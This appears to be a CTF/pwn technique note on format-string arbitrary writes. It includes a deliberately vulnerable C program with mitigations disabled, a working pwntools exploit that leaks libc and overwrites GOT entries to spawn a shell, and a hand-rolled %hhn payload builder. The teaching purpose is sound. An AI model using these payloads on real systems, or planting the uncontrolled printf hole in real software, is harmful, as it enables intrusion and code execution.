---
title: "Format String - Arbitrary Write with %n, %hn, %hhn"
category: pwn
subcategory: format-string
type: technique
tags: [format-string, fmtstr, fsb, printf, percent-n, arbitrary-write, write-what-where, got, plt, relro, pie, aslr, rop, ret2libc, one-gadget, fortify-source, pwntools, gef, pwndbg, checksec]
difficulty: medium
summary: "%n writes the number of characters printed so far to a pointer argument - turn it into a controlled write-what-where and overwrite a GOT entry or a return address."
when_to_use:
  - "You already have a format-string read primitive and need code execution"
  - "RELRO is Partial or absent, so the GOT is writable"
  - "You need to overwrite a saved return address, a function pointer or a loop counter"
  - "The program loops so you get several printf rounds"
tools: [pwntools, gdb, gef, pwndbg, checksec, one-gadget, ropgadget]
related: [fmtstr-read-leak, fmtstr-advanced, rop-got-overwrite, rop-one-gadget, rop-ret2libc, mitigation-modern-playbook, mitigation-libc-identification, pwntools-cheatsheet]
---

## TL;DR

`%n` takes the next argument as an `int *` and stores the number of characters
printed so far. Control the character count with width specifiers (`%100c`) and
control the pointer by putting it in your own format string, and you have an
arbitrary write. `%hn` writes 2 bytes, `%hhn` writes 1 - which is how you write an
8-byte address without printing four billion characters.

## Recognise it

- You already confirmed a format-string read (`%p` echoes hex).
- `checksec` says `Partial RELRO` -> the GOT is writable, `printf@got` or
  `exit@got` is the classic target.
- The program calls a libc function *after* your `printf` (so an overwritten GOT
  entry actually gets used): `puts`, `exit`, `printf`, `atoi`, `free`.
- The program loops, giving you multiple writes.
- `_FORTIFY_SOURCE` is **not** in play (see pitfalls - it blocks `%n`).

## Vulnerable source

```c
/* fmtw.c - format string bug, then a libc call whose GOT entry you can hijack. */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) { system("/bin/sh"); }

void vuln(void) {
    char buf[256];
    for (int i = 0; i < 4; i++) {
        printf("> ");
        fflush(stdout);
        if (!fgets(buf, sizeof buf, stdin)) return;
        printf(buf);             /* the bug */
        putchar('\n');
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    exit(0);                     /* exit@got is a lovely target */
}
```

```bash
# i386, partial RELRO, no PIE - the classic teaching target
gcc -m32 -fno-stack-protector -no-pie -z norelro -Wno-format-security \
    -U_FORTIFY_SOURCE -O0 -o fmtw32 fmtw.c

# x86-64, partial RELRO, no PIE
gcc -fno-stack-protector -no-pie -z norelro -Wno-format-security \
    -U_FORTIFY_SOURCE -O0 -o fmtw64 fmtw.c

checksec --file=./fmtw64     # want: Partial RELRO, No PIE
```

`-U_FORTIFY_SOURCE` matters: modern distros default to `-D_FORTIFY_SOURCE=2`,
which makes glibc reject `%n` in a format string that lives in writable memory.

## Theory

### What `%n` does

```c
int n;
printf("hello%n", &n);    /* n == 5 */
```

`printf` counts every character it *emits* and, on `%n`, stores that count through
the pointer argument. Variants control the width of the store:

| Spec | Stores | Max value | Chars you must print |
|------|--------|-----------|----------------------|
| `%n` | 4 bytes (`int`) | 0xffffffff | up to 4 billion - unusable |
| `%hn` | 2 bytes (`short`) | 0xffff | at most 65535 |
| `%hhn` | 1 byte (`char`) | 0xff | at most 255 |

### Controlling the count

Width specifiers emit padding without consuming meaningful output:

```text
%100c        emits 100 characters (consumes ONE argument)
%100x        emits 100 characters (consumes ONE argument)
%100$c       WRONG - that is direct parameter access, not width
%.100d       precision padding, also 100 characters
```

So the shape of a write is:

```text
  <pad to the value we want>  %<slot>$n
```

and for a multi-part write you pad *incrementally*, because the counter only
goes up:

```text
value 0x0804a0b0 written as four %hhn:
  byte 0xb0 = 176   -> print 176 chars, %hhn to addr+0
  byte 0xa0 = 160   -> 160 < 176, so print 160 + 256 = 416 total (wrap)
  byte 0x04 = 4     -> wrap again: 4 + 512
  byte 0x08 = 8     -> 8 + 768
```

Because a `%hhn` only stores the low byte, wrapping past 256 is free. That is why
**ordering the writes by ascending byte value** (or just using modular arithmetic)
keeps the payload short.

### Getting your pointer into the argument list

On i386 your buffer is a few stack slots away, so:

```text
[ addr ][ addr+1 ][ addr+2 ][ addr+3 ][ %Ac%<off+0>$hhn %Bc%<off+1>$hhn ... ]
 ^ four raw pointers at the very front, offsets off..off+3
```

On x86-64 those raw pointers contain null bytes, which truncate the string for
anything that stops at `\x00`. Put the format text first, pad to a multiple of 8,
then append the pointers:

```text
[ %Ac%<off+k>$hhn %Bc%<off+k+1>$hhn ... ][ pad to 8 ][ addr ][ addr+1 ][ addr+2 ]
```

`pwntools` does exactly this and computes `k` for you.

## Attack

1. Get the read primitive and find `BUF_OFF` (see fmtstr-read-leak).
2. Choose a target:
   - `exit@got` -> `win` / `system` (fires when the program exits)
   - `printf@got` -> `system`, then send `/bin/sh` as the next "format string"
   - `puts@got` -> `system` (the `puts(s)` call becomes `system(s)`)
   - a saved return address on the stack (works under full RELRO)
3. Choose a value. If it is a libc address you need a libc leak first, so plan on
   two rounds: leak, then write.
4. Build the payload with `fmtstr_payload` (or by hand) and send it.
5. Trigger the overwritten call.

## Exploit

```python
#!/usr/bin/env python3
"""fmtstr arbitrary write: leak libc, then overwrite exit@got with system,
then make the program exit with "/bin/sh" reachable.

    python3 exploit.py
    python3 exploit.py GDB
    python3 exploit.py REMOTE HOST=h PORT=1337
"""
import os
import sys

from pwn import *

EXE  = './fmtw64'
HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context.binary = exe = ELF(EXE, checksec=False)
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('./libc.so.6', checksec=False) if os.path.exists('./libc.so.6') else None

BUF_OFF = 6          # measure this - see fmtstr-read-leak


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(EXE, gdbscript='b *exit\nc\n')
    return process(EXE)


def round_(io, payload):
    io.sendlineafter(b'> ', payload)
    return io.recvline(keepends=False)


def main():
    io = start()

    # ---- round 1: leak libc through a GOT read -----------------------------
    # %s on puts@got. Conversions first, pointer last (null bytes!).
    head = b'%' + str(BUF_OFF + 2).encode() + b'$s'
    head = head.ljust(16, b'.')
    leak_payload = head + p64(exe.got['puts'])
    out = round_(io, leak_payload)
    raw = out[16:22] if len(out) >= 22 else out.rstrip(b'.')[:6]
    puts_addr = u64(raw.ljust(8, b'\x00'))
    log.success('puts@libc = %#x', puts_addr)

    if libc is None:
        log.error('drop the challenge libc next to the binary, or identify it '
                  '(see mitigation-libc-identification)')
        return
    libc.address = puts_addr - libc.symbols['puts']
    log.success('libc base = %#x', libc.address)
    system = libc.symbols['system']
    log.success('system    = %#x', system)

    # ---- round 2: overwrite exit@got with system --------------------------
    payload = fmtstr_payload(BUF_OFF, {exe.got['exit']: system},
                             write_size='short')
    log.info('write payload is %d bytes', len(payload))
    round_(io, payload)

    # ---- round 3: the better target -------------------------------------
    # exit@got -> system means system(0), which is not a shell. Hijack
    # printf@got instead: the NEXT line you send becomes system(line).
    payload = fmtstr_payload(BUF_OFF, {exe.got['printf']: system},
                             write_size='short')
    round_(io, payload)
    io.sendline(b'/bin/sh\x00')          # printf(buf) is now system(buf)

    io.interactive()


if __name__ == '__main__':
    main()
```

## Building the payload by hand (no pwntools)

```python
#!/usr/bin/env python3
"""Hand-rolled %hhn payload builder - useful when fmtstr_payload's assumptions
(no output printed before your format string, pointers allowed up front) do not
hold, and to show exactly what the generated string looks like.

Layout produced:
    [ %Ac%<slot+0>$hhn %Bc%<slot+1>$hhn ... ][ \x00 pad ][ addr+0 ][ addr+1 ] ...
"""
import re

from pwn import *

context.arch = 'amd64'


def build(offset, addr, value, nbytes=8, already_written=0, word=8):
    """Write `value` (nbytes wide) to `addr`, one byte per %hhn."""
    pack = p64 if word == 8 else p32
    # (target address, byte to store), sorted so the counter only grows.
    targets = sorted(((addr + i, (value >> (8 * i)) & 0xff)
                      for i in range(nbytes)), key=lambda t: t[1])

    def render(slot):
        written = already_written
        out = b''
        for i in range(len(targets)):
            delta = (targets[i][1] - (written % 256)) % 256
            if delta:
                out += b'%' + str(delta).encode() + b'c'
                written += delta
            out += b'%' + str(slot + i).encode() + b'$hhn'
        return out

    # Fixed point: the slot index depends on the length, which depends on the
    # slot index. Two or three iterations always converge.
    slot = offset
    for _ in range(4):
        body = render(slot)
        pad = (-len(body)) % word
        new_slot = offset + (len(body) + pad) // word
        if new_slot == slot:
            break
        slot = new_slot

    body = render(slot)
    pad = (-len(body)) % word
    return body + b'\x00' * pad + b''.join(pack(a) for a, _ in targets)


if __name__ == '__main__':
    payload = build(6, 0x404018, 0x7ffff7a52290, nbytes=6)
    print(len(payload), payload)
    # Self-check: slot indexes are consecutive and land on the pointer block.
    idxs = [int(x) for x in re.findall(rb'%(\d+)\$hhn', payload)]
    assert idxs == list(range(idxs[0], idxs[0] + len(idxs))), idxs
    ptr_start = (idxs[0] - 6) * 8            # 6 == the `offset` we passed in
    ptrs = [u64(payload[ptr_start + 8 * i:ptr_start + 8 * i + 8])
            for i in range(len(idxs))]
    assert sorted(ptrs) == [0x404018 + i for i in range(6)], ptrs
    print('ok - first pointer slot is %%%d$hhn' % idxs[0])
```

## pwntools API reference

```python
# One-shot: build a payload that performs the writes
fmtstr_payload(offset, {addr: value})
fmtstr_payload(offset, {addr: value}, write_size='byte')    # %hhn  (default)
fmtstr_payload(offset, {addr: value}, write_size='short')   # %hn
fmtstr_payload(offset, {addr: value}, write_size='int')     # %n
fmtstr_payload(offset, {a1: v1, a2: v2})                    # several at once
fmtstr_payload(offset, {addr: value}, numbwritten=8)        # chars already printed
fmtstr_payload(offset, {addr: value}, write_size_max='short')
fmtstr_payload(offset, {addr: b'\xde\xad'})                 # raw bytes as the value

# Automated: hand it a function that performs one printf round
def send_fmt(payload):
    io.sendlineafter(b'> ', payload)
    return io.recvline()

fmt = FmtStr(execute_fmt=send_fmt)       # probes for the offset itself
log.info('offset = %d', fmt.offset)
fmt.write(exe.got['exit'], exe.sym['win'])
fmt.write(exe.got['puts'], libc.sym['system'])
fmt.execute_writes()                     # flushes all queued writes
```

`numbwritten` is the one that bites people: if the program prints `"Hello, "`
before your format string is interpreted (common with `printf("Hi %s", buf)`),
the counter is already at 7 and every computed pad is wrong by 7.

## Choosing the target

| Target | Fires when | Notes |
|--------|-----------|-------|
| `exit@got` | the program exits normally | reliable, but `system(0)` is not a shell - pair with a one_gadget |
| `printf@got` | the next `printf(buf)` | best: the next line you send becomes `system(line)` |
| `puts@got` | the next `puts(s)` | `system(s)` with `s` = whatever it was printing |
| `atoi@got` / `strtol@got` | the next menu read | `system(menu_input)` - type `/bin/sh` |
| `free@got` | the next `free(p)` | `system(p)` with the chunk contents |
| `__stack_chk_fail@got` | when a canary check fails | lets you *use* the canary crash |
| saved return address | on the current function's `ret` | works under FULL RELRO |
| `.fini_array[0]` | at exit, before libc teardown | non-PIE, no RELRO only |
| a function pointer in .bss/.data | when it is called | often the cleanest |

## Variants & pitfalls

- **`_FORTIFY_SOURCE=2` blocks `%n`** when the format string is in writable memory
  (`*** %n in writable segment detected ***` then abort). Workarounds: put the
  format string in read-only memory (rarely possible), or give up on `%n` and use
  the read primitive plus another bug. See fmtstr-advanced.
- **Output length limits.** `snprintf(out, 64, user)` truncates - the *count* still
  advances past the truncation point in glibc, but nothing is emitted, so `%hhn`
  still works while the visible output stops. Test it.
- **Line-length limits.** `fgets(buf, 64, stdin)` caps the payload. `%hhn` x8 with
  padding can exceed that; prefer `%hn` x4 or `%n` x2 for short buffers, or spread
  the write over several rounds.
- **Null bytes.** On x86-64 every target pointer has `\x00\x00` in its top bytes.
  Format text first, pointers last, and never use a reader that stops at `\x00`.
- **PIE.** Every target address moves. Leak first, then write, in that order.
- **Full RELRO.** No GOT writes at all. Target a saved return address on the stack
  instead - which means you need a stack leak too.
- **The counter never decreases.** Sort your byte writes ascending, or rely on
  `% 256` wrapping. `fmtstr_payload` handles this.
- **`%c` vs `%x` padding.** `%100c` consumes one vararg; `%100x` also consumes one.
  If you use `%100$c` you have written direct-parameter-access, not a width -
  a very common typo.
- **One write per round.** Some binaries call `printf` exactly once. Then every
  byte must go in that single format string, which makes `%hn` x4 the sweet spot.
- **Writing a small value.** To write `0x0000` you must print 0x10000 characters
  (the counter cannot wrap to exactly 0 within `%hn` unless you print 65536).
  Split into two `%hhn` writes of 0 instead - each needs only a 256-wrap.

## Tools

```bash
# Confirm RELRO and find writable GOT entries
checksec --file=./fmtw64
readelf -r ./fmtw64 | grep JUMP_SLOT
objdump -R ./fmtw64

# Which libc functions get called after your printf?
objdump -d -M intel ./fmtw64 | grep -E 'call.*@plt'

# One-gadget candidates for the value you write
one_gadget ./libc.so.6
```

```gdb
watch *(unsigned long*)0x404018   # break the moment the GOT entry changes
c
x/gx 0x404018                     # confirm the write landed
got                               # gef and pwndbg both annotate the GOT
```
